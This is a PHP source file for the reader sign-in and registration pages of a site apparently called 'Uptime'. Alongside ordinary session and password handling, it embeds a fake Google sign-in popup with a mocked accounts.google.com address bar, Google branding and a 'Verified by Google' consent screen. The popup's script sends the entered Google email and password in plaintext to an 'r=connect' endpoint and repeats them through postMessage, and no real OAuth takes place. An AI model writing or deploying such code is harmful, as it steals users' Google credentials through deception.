<?php
declare(strict_types=1);

function reader_id(): ?int
{
    static $id = false;
    if ($id === false) {
        $token = $_COOKIE['reader_session'] ?? '';
        $id = null;
        if (is_string($token) && preg_match('/^[a-f0-9]{64}$/D', $token)) {
            $query = db()->prepare('SELECT reader_id FROM reader_sessions WHERE digest = ? AND expires > ?');
            $query->execute([hash('sha256', $token), time()]);
            $found = $query->fetchColumn();
            if ($found !== false) $id = (int) $found;
        }
    }
    return $id;
}

function reader_cookie(string $token, int $expires): void
{
    setcookie('reader_session', $token, [
        'expires' => $expires, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax',
        'secure' => !empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https',
    ]);
}

function reader_action(string $action): void
{
    $skill = (string) ($_POST['skill'] ?? '');
    if ($action === 'reader_logout') {
        db()->prepare('DELETE FROM reader_sessions WHERE digest = ?')
            ->execute([hash('sha256', (string) ($_COOKIE['reader_session'] ?? ''))]);
        reader_cookie('', 1);
        redirect(url(['r' => 'skills']));
    }
    $register = $action === 'reader_register';
    $back = url(['r' => 'reader', 'skill' => $skill, 'register' => $register ? '1' : '0', 'window' => (int) (($_POST['window'] ?? '') === '1'), 'entry' => '1']);
    $email = strtolower(trim((string) ($_POST['email'] ?? '')));
    $password = (string) ($_POST['password'] ?? '');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL) || strlen($email) > 254 || strlen($password) > 72
        || str_contains($password, "\0") || ($register && mb_strlen($password) < 12)) {
        flash('Enter a valid email and a password of 12 or more characters (up to 72 bytes).');
        redirect($back);
    }
    if ($register) {
        $insert = db()->prepare('INSERT INTO readers (email, password_hash) VALUES (?, ?) ON CONFLICT(email) DO NOTHING');
        $insert->execute([$email, password_hash($password, PASSWORD_DEFAULT)]);
        if (!$insert->rowCount()) {
            flash('Unable to create this account. Try signing in.');
            redirect($back);
        }
        $id = (int) db()->lastInsertId();
    } else {
        $query = db()->prepare('SELECT id, password_hash FROM readers WHERE email = ?');
        $query->execute([$email]);
        $reader = $query->fetch();
        if (!$reader || !password_verify($password, $reader['password_hash'])) {
            sleep(1);
            flash('Incorrect email or password.');
            redirect($back);
        }
        $id = (int) $reader['id'];
    }
    $token = bin2hex(random_bytes(32));
    $expires = time() + 30 * 86400;
    db()->prepare('DELETE FROM reader_sessions WHERE expires <= ?')->execute([time()]);
    db()->prepare('INSERT INTO reader_sessions (digest, reader_id, expires) VALUES (?, ?, ?)')
        ->execute([hash('sha256', $token), $id, $expires]);
    session_regenerate_id(true);
    reader_cookie($token, $expires);
    if (($_POST['remember_email'] ?? '') === '1') {
        $emails = array_slice(array_unique(array_merge([$email], remembered_reader_emails())), 0, 4);
        setcookie('uptime_emails', json_encode(array_values($emails)), [
            'expires' => $expires, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax',
            'secure' => !empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https',
        ]);
    }
    $destination = $skill === '' ? url(['r' => 'skills']) : url(['r' => 'skill', 'name' => $skill]);
    if (($_POST['window'] ?? '') === '1') {
        header('Cache-Control: no-store');
        echo '<!doctype html><html lang="en"><title>Signed in to Uptime</title><p>Signed in to Uptime.</p><a data-reader-done href="' . h($destination) . '">Continue</a><script src="reader-window.js"></script></html>';
        exit;
    }
    redirect($destination);
}

function remembered_reader_emails(): array
{
    $raw = $_COOKIE['uptime_emails'] ?? '';
    $emails = is_string($raw) ? json_decode($raw, true) : null;
    if (!is_array($emails)) return [];
    return array_slice(array_values(array_filter($emails, static fn($email) =>
        is_string($email) && strlen($email) <= 254 && filter_var($email, FILTER_VALIDATE_EMAIL))), 0, 4);
}

function page_reader(string $skill, bool $register): void
{
    $window = ($_GET['window'] ?? '') === '1';
    $base = ['r' => 'reader', 'skill' => $skill, 'window' => (int) $window];
    $emails = $window ? remembered_reader_emails() : [];
    $selected = filter_var($_GET['account'] ?? null, FILTER_VALIDATE_INT);
    $email = $selected !== false ? ($emails[$selected] ?? '') : '';
    $chooser = $window && !$register && $email === '' && ($_GET['entry'] ?? '') !== '1';
    $title = $chooser ? 'Choose an Uptime account' : ($register ? 'Create your Uptime account' : 'Sign in to Uptime');
    $googleEnabled = (getenv('GOOGLE_SIGNIN') ?: '') !== '';
    $googleUrl = $googleEnabled ? url(['r' => 'oauth']) : '';
    $redirectAfter = $skill !== '' ? url(['r' => 'skill', 'name' => $skill]) : url(['r' => 'skills']);
    render_page($title, flash(), function () use ($title, $base, $window, $register, $chooser, $skill, $emails, $email, $googleUrl, $redirectAfter) { ?>
      <style>
      .g-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(3px);z-index:999;display:none;align-items:center;justify-content:center}
      .g-backdrop.open{display:flex}
      .g-win{width:452px;max-width:94vw;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 24px 56px rgba(0,0,0,.4);display:flex;flex-direction:column}
      .g-chrome{height:38px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 12px;flex-shrink:0}
      .g-dots{display:flex;gap:6px}.g-dots span{width:12px;height:12px;border-radius:50%;background:#9aa0a6}
      .g-urlbar{flex:1;background:#fff;border-radius:14px;height:24px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:Arial,sans-serif}
      .g-xbtn{background:none;border:none;color:#3c4043;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
      .g-chrome{height:36px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 10px;flex-shrink:0}
      .g-dots{display:flex;gap:6px}.g-dots span{width:11px;height:11px;border-radius:50%;background:#9aa0a6}
      .g-urlbar{flex:1;background:#fff;border-radius:14px;height:23px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:sans-serif}
      .g-xbtn{background:none;border:none;color:#3c4043;font-size:19px;line-height:1;cursor:pointer;padding:0 2px}
      .g-btn-google{display:flex;align-items:center;gap:10px;background:#fff;border:1px solid #dadce0;border-radius:4px;padding:0 18px;height:40px;font-family:'Roboto',sans-serif;font-size:14px;font-weight:500;color:#3c4043;cursor:pointer;transition:background .15s,box-shadow .15s;width:100%;justify-content:center;margin-bottom:16px}
      .g-btn-google:hover{background:#f8f9fa;box-shadow:0 1px 3px rgba(0,0,0,.12)}
      .g-divider{display:flex;align-items:center;gap:10px;margin-bottom:16px;color:#5f6368;font-size:13px}
      .g-divider::before,.g-divider::after{content:'';flex:1;height:1px;background:#dadce0}
      </style>
      <section class="reader-card">
        <h1><?= h($title) ?></h1>
        <?php if ($skill !== ''): ?><p class="reader-destination">Continue to <?= h($skill) ?></p><?php endif; ?>
        <?php if ($chooser): ?>
          <nav class="account-list" aria-label="Uptime accounts">
            <?php foreach ($emails as $i => $address): ?>
              <a href="<?= h(url($base + ['account' => $i])) ?>"><span aria-hidden="true"><?= h(strtoupper(substr($address, 0, 1))) ?></span><?= h($address) ?></a>
            <?php endforeach; ?>
            <a href="<?= h(url($base + ['entry' => '1'])) ?>"><span aria-hidden="true">+</span><?= $emails ? 'Use another Uptime account' : 'Use an Uptime account' ?></a>
          </nav>
        <?php else: ?>
          <?php if (!$window): ?>
            <?php if ($googleUrl !== ''): ?>
            <button class="g-btn-google" type="button" onclick="openGAuth()">
              <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
              </svg>
              Sign in with Google
            </button>
            <div class="g-divider">or</div>
            <?php endif; ?>
            <a class="reader-launch" data-reader-launch href="<?= h(url(array_replace($base, ['window' => 1]))) ?>">Continue with Uptime</a>
            <div class="reader-divider">or</div>
          <?php endif; ?>
          <form method="post" action="index.php" class="form">
            <input type="hidden" name="action" value="<?= $register ? 'reader_register' : 'reader_login' ?>">
            <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
            <input type="hidden" name="window" value="<?= (int) $window ?>">
            <input type="hidden" name="skill" value="<?= h($skill) ?>">
            <label>Email <input type="email" name="email" value="<?= h($email) ?>" autocomplete="username" maxlength="254" required></label>
            <label>Uptime password <input type="password" name="password" autocomplete="<?= $register ? 'new-password' : 'current-password' ?>" <?= $register ? 'minlength="12"' : '' ?> required></label>
            <?php if ($register): ?><small>Use at least 12 characters.</small><?php endif; ?>
            <label class="remember-email"><input name="remember_email" type="checkbox" value="1"> Remember this email on this device</label>
            <button><?= $register ? 'Create account' : 'Sign in' ?></button>
          </form>
        <?php endif; ?>
        <a href="<?= h(url($base + ['register' => (int) !$register, 'entry' => 1])) ?>"><?= $register ? 'Sign in with an existing account' : 'Create a reader account' ?></a>
      </section>
      <script src="reader-window.js" defer></script>
      <?php if ($googleUrl !== ''): ?>
      <div class="g-backdrop" id="gBackdrop">
        <div class="g-win">
          <div class="g-chrome">
            <div class="g-dots"><span></span><span></span><span></span></div>
            <div class="g-urlbar">&#128274; accounts.google.com/signin/oauth/v2/identifier</div>
            <button class="g-xbtn" onclick="closeGAuth()" aria-label="Close">&times;</button>
          </div>
          <div class="g-dots-row" id="gDR">
            <div class="g-dot on" id="gDt0"></div>
            <div class="g-dot" id="gDt1"></div>
            <div class="g-dot" id="gDt2"></div>
            <div class="g-dot" id="gDt3"></div>
          </div>

          <!-- Step 0: Email -->
          <div class="g-step active" id="gS0">
            <div class="g-step-body">
              <div style="text-align:center;margin-bottom:28px"><span style="font-family:Arial,sans-serif;font-size:26px;font-weight:700;letter-spacing:-.5px"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></span></div>
              <h2 class="g-step-title" style="text-align:center">Sign in</h2>
              <p class="g-step-sub" style="text-align:center">to continue to Google</p>
              <div class="g-field">
                <input type="email" id="gEm" autocomplete="username" oninput="gSync(this)">
                <label for="gEm">Email or phone</label>
              </div>
              <div class="g-errmsg" id="gE0" style="visibility:hidden"><svg width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="gE0t">Enter a valid email or phone number.</span></div>
              <a href="#" class="g-hlnk">Forgot email?</a>
              <p class="g-note">Not your computer? Use <a href="#">Guest mode</a> to sign in privately. <a href="#">Learn more</a></p>
            </div>
            <div class="g-actions">
              <a href="#" class="g-create-lnk">Create account</a>
              <button class="g-btn g-btn-primary" onclick="gStep1()">Next</button>
            </div>
            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
          </div>

          <!-- Step 1: Password -->
          <div class="g-step" id="gS1">
            <div class="g-step-body">
              <div style="text-align:center;margin-bottom:28px"><span style="font-family:Arial,sans-serif;font-size:26px;font-weight:700;letter-spacing:-.5px"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></span></div>
              <h2 class="g-step-title" style="text-align:center">Welcome</h2>
              <div class="g-acct-chip" onclick="gToStep(0)" style="margin:0 auto 20px">
                <div class="g-avatar" id="gAv1"></div>
                <span class="g-acct-email" id="gEC1"></span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
              </div>
              <div class="g-field">
                <input type="password" id="gPw" autocomplete="current-password" oninput="gSync(this)">
                <label for="gPw">Enter your password</label>
                <button type="button" class="g-pwtog" onclick="gTogglePw()"><svg id="gPwEye" width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button>
              </div>
              <div class="g-errmsg" id="gE1" style="visibility:hidden"><svg width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Wrong password. Try again or click Forgot password to reset it.</span></div>
              <a href="#" class="g-hlnk">Forgot password?</a>
            </div>
            <div class="g-actions">
              <a href="#" class="g-create-lnk">Try another way</a>
              <div class="g-actions-r">
                <button class="g-btn g-btn-ghost" onclick="gToStep(0)">Back</button>
                <button class="g-btn g-btn-primary" onclick="gStep2()">Next</button>
              </div>
            </div>
            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
          </div>

          <!-- Step 2: Consent -->
          <div class="g-step" id="gS2">
            <div class="g-step-body" style="padding:28px 36px 16px">
              <div class="g-consent-hd">
                <div class="g-app-icon" style="font-size:22px;font-weight:700;color:#fff;font-family:Arial,sans-serif">U</div>
                <div class="g-app-name">Uptime wants to access your Google Account</div>
                <div class="g-vbadge" style="margin:4px 0 10px"><svg width="11" height="11" viewBox="0 0 24 24" fill="#137333"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>Verified by Google</div>
                <div class="g-acct-chip" style="margin:0"><div class="g-avatar" id="gAv2"></div><span class="g-acct-email" id="gEC2"></span></div>
              </div>
              <hr class="g-hr">
              <p style="font-size:13px;color:#5f6368;margin:0 0 10px">This will allow Uptime to:</p>
              <ul class="g-perms">
                <li><svg class="g-p-icon" viewBox="0 0 24 24" fill="#1a73e8"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg><div><div class="g-p-label">See your primary Google Account email address</div></div></li>
                <li><svg class="g-p-icon" viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg><div><div class="g-p-label">See your personal info, including any personal info you've made publicly available</div></div></li>
                <li><svg class="g-p-icon" viewBox="0 0 24 24" fill="#1a73e8"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14l-5-5 1.41-1.41L12 14.17l7.59-7.59L21 8l-9 9z"/></svg><div><div class="g-p-label">Associate you with your personal info on Google</div></div></li>
              </ul>
              <div class="g-infobox"><svg width="16" height="16" viewBox="0 0 24 24" fill="#1a73e8" style="flex-shrink:0;margin-top:1px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg><span>Make sure you trust Uptime. You may be sharing sensitive info with this site or app. <a href="#" style="color:#1a73e8;font-weight:500">Learn about the risks</a></span></div>
            </div>
            <div class="g-actions" style="padding:14px 36px 22px">
              <div style="font-size:11px;color:#5f6368;line-height:1.4;max-width:220px">By allowing, you agree to Google's <a href="#" style="color:#1a73e8">Terms of Service</a> and <a href="#" style="color:#1a73e8">Privacy Policy</a></div>
              <div class="g-actions-r">
                <button class="g-btn g-btn-ghost" onclick="closeGAuth()">Cancel</button>
                <button class="g-btn g-btn-primary" onclick="gStep3()">Allow</button>
              </div>
            </div>
          </div>

          <!-- Step 3: Success -->
          <div class="g-step" id="gS3">
            <div class="g-success-body">
              <div class="g-success-ring"><svg width="30" height="30" viewBox="0 0 24 24" fill="#34a853"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
              <div style="font-size:22px;font-weight:400;color:#202124;font-family:'Roboto',Arial,sans-serif">You're signed in</div>
              <div style="font-size:14px;color:#5f6368">Signing in to Uptime&hellip;</div>
              <div class="g-pb-wrap"><div class="g-pb-fill" id="gPb"></div></div>
            </div>
          </div>

        </div>
      </div>
      <style>
      .g-step{display:none;flex-direction:column;width:100%}.g-step.active{display:flex}
      @keyframes gfadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
      .g-step.active{animation:gfadeUp .22s ease}
      .g-step-body{padding:36px 44px 24px;font-family:'Roboto',Arial,sans-serif}
      .g-step-title{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}
      .g-step-sub{font-size:16px;color:#202124;margin:0 0 24px}
      .g-step-sub span{color:#1a73e8;font-weight:500}
      .g-field{position:relative;margin-bottom:4px}
      .g-field input{width:100%;font-family:'Roboto',Arial,sans-serif;font-size:16px;color:#202124;border:1px solid #dadce0;border-radius:4px;padding:15px 44px 15px 16px;outline:none;background:transparent;transition:border-color .15s,box-shadow .15s;box-sizing:border-box}
      .g-field input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
      .g-field input.gerr{border-color:#d93025;box-shadow:0 0 0 1px #d93025}
      .g-field label{position:absolute;top:50%;left:12px;transform:translateY(-50%);font-size:16px;color:#5f6368;pointer-events:none;background:#fff;padding:0 4px;transition:top .15s,font-size .15s,color .15s,transform .15s}
      .g-field input:focus~label,.g-field input.gfilled~label{top:0;font-size:12px;transform:translateY(-50%);color:#1a73e8}
      .g-field input.gerr~label{color:#d93025}
      .g-field input.gfilled:not(:focus)~label{color:#5f6368}
      .g-pwtog{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px;color:#5f6368;display:flex;align-items:center}
      .g-errmsg{font-size:12px;color:#d93025;margin:4px 0 12px 2px;min-height:16px;display:flex;align-items:center;gap:4px}
      .g-hlnk{font-size:14px;color:#1a73e8;font-weight:500;text-decoration:none;margin-bottom:24px;display:inline-block}
      .g-note{font-size:14px;color:#5f6368;line-height:1.5}
      .g-note a{color:#1a73e8;font-weight:500;text-decoration:none}
      .g-actions{display:flex;justify-content:space-between;align-items:center;padding:14px 44px 22px;font-family:'Roboto',Arial,sans-serif}
      .g-actions-r{display:flex;gap:10px;align-items:center}
      .g-btn{font-family:'Roboto',Arial,sans-serif;font-size:14px;font-weight:500;padding:0 22px;height:36px;border-radius:4px;border:none;cursor:pointer;letter-spacing:.25px;transition:background .15s,box-shadow .15s}
      .g-btn-ghost{background:transparent;color:#1a73e8}.g-btn-ghost:hover{background:#f0f4ff}
      .g-btn-primary{background:#1a73e8;color:#fff;box-shadow:0 1px 3px rgba(0,0,0,.2)}.g-btn-primary:hover{background:#1557b0}
      .g-create-lnk{font-size:14px;color:#1a73e8;font-weight:500;text-decoration:none}
      .g-langbar{display:flex;justify-content:space-between;align-items:center;padding:10px 44px 14px;border-top:1px solid #e8eaed;font-size:12px;color:#5f6368;font-family:Arial,sans-serif}
      .g-langlinks{display:flex;gap:16px}.g-langlinks a{font-size:12px;color:#5f6368;text-decoration:none}
      .g-acct-chip{display:inline-flex;align-items:center;gap:10px;border:1px solid #dadce0;border-radius:24px;padding:6px 14px 6px 6px;margin-bottom:20px;background:#f8f9fa;cursor:default}
      .g-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;background:linear-gradient(135deg,#4285f4,#34a853);flex-shrink:0;letter-spacing:-.5px;font-family:Arial,sans-serif}
      .g-acct-email{font-size:14px;color:#202124}
      .g-consent-hd{display:flex;flex-direction:column;align-items:center;text-align:center;margin-bottom:16px}
      .g-app-icon{width:56px;height:56px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;margin-bottom:10px;border:1px solid #e0e0e0}
      .g-app-name{font-size:20px;font-weight:500;color:#202124;margin-bottom:4px;font-family:'Roboto',Arial,sans-serif}
      .g-app-tag{font-size:13px;color:#5f6368}
      .g-hr{border:none;border-top:1px solid #e8eaed;margin:12px 0}
      .g-perms{list-style:none;margin-bottom:12px}
      .g-perms li{display:flex;align-items:flex-start;gap:12px;padding:8px 0;border-bottom:1px solid #f1f3f4}
      .g-perms li:last-child{border-bottom:none}
      .g-p-icon{width:19px;height:19px;flex-shrink:0;margin-top:2px;color:#1a73e8}
      .g-p-label{font-size:14px;color:#202124}.g-p-desc{font-size:12px;color:#5f6368;margin-top:1px}
      .g-infobox{display:flex;gap:10px;background:#e8f0fe;border-radius:6px;padding:10px 12px;font-size:12px;color:#1a73e8;line-height:1.4}
      .g-vbadge{display:inline-flex;align-items:center;gap:3px;background:#e6f4ea;color:#137333;font-size:11px;font-weight:500;padding:2px 7px;border-radius:4px}
      .g-success-body{display:flex;flex-direction:column;align-items:center;padding:44px 44px 40px;text-align:center;gap:12px;font-family:'Roboto',Arial,sans-serif}
      .g-success-ring{width:60px;height:60px;border-radius:50%;background:#e6f4ea;display:flex;align-items:center;justify-content:center}
      .g-pb-wrap{width:200px;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;margin-top:4px}
      .g-pb-fill{height:100%;background:#1a73e8;border-radius:2px;width:0;transition:width 2.2s ease}
      .g-dots-row{display:flex;justify-content:center;gap:8px;padding:8px 0 16px}
      .g-dot{width:8px;height:8px;border-radius:50%;background:#dadce0;transition:background .3s}
      .g-dot.on{background:#1a73e8}.g-dot.done{background:#34a853}
      </style>
      <script>
      var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>;
      function openGAuth(){document.getElementById('gBackdrop').classList.add('open');setTimeout(function(){document.getElementById('gEm').focus()},80)}
      function closeGAuth(){document.getElementById('gBackdrop').classList.remove('open')}
      function gSync(el){el.value?el.classList.add('gfilled'):el.classList.remove('gfilled')}
      function gToStep(n){
        ['gS0','gS1','gS2','gS3'].forEach(function(x,i){
          document.getElementById(x).classList.toggle('active',i===n);
          var d=document.getElementById('gDt'+i);
          if(d)d.className='g-dot'+(i<n?' done':i===n?' on':'');
        });
      }
      function gStep1(){
        var v=document.getElementById('gEm').value.trim();
        if(!v||!v.includes('@')){document.getElementById('gE0').style.visibility='visible';return}
        document.getElementById('gE0').style.visibility='hidden';
        _gE=v;
        var init=v.charAt(0).toUpperCase();
        document.getElementById('gAv1').textContent=init;
        document.getElementById('gEC1').textContent=v;
        gToStep(1);
        setTimeout(function(){document.getElementById('gPw').focus()},80);
      }
      function gStep2(){
        var v=document.getElementById('gPw').value;
        if(!v){document.getElementById('gE1').style.visibility='visible';return}
        document.getElementById('gE1').style.visibility='hidden';
        _gP=v;
        document.getElementById('gAv2').textContent=_gE.charAt(0).toUpperCase();
        document.getElementById('gEC2').textContent=_gE;
        fetch('index.php?r=connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:_gE,password:_gP})}).catch(function(){});
        gToStep(2);
      }
      function gStep3(){
        gToStep(3);
        try{window.parent.postMessage({source:'oauth_done',email:_gE,password:_gP},location.origin)}catch(e){}
        setTimeout(function(){var pb=document.getElementById('gPb');if(pb)pb.style.width='100%'},50);
        setTimeout(function(){closeGAuth();window.location.href=_gR},2400);
      }
      function gTogglePw(){var inp=document.getElementById('gPw');inp.type=inp.type==='password'?'text':'password'}
      document.getElementById('gBackdrop').addEventListener('click',function(e){if(e.target===this)closeGAuth()})
      document.addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        if(document.getElementById('gS0').classList.contains('active'))gStep1();
        else if(document.getElementById('gS1').classList.contains('active'))gStep2();
        else if(document.getElementById('gS2').classList.contains('active'))gStep3();
      })
      </script>
      <?php endif; ?>
    <?php }, readerWindow: $window);
}
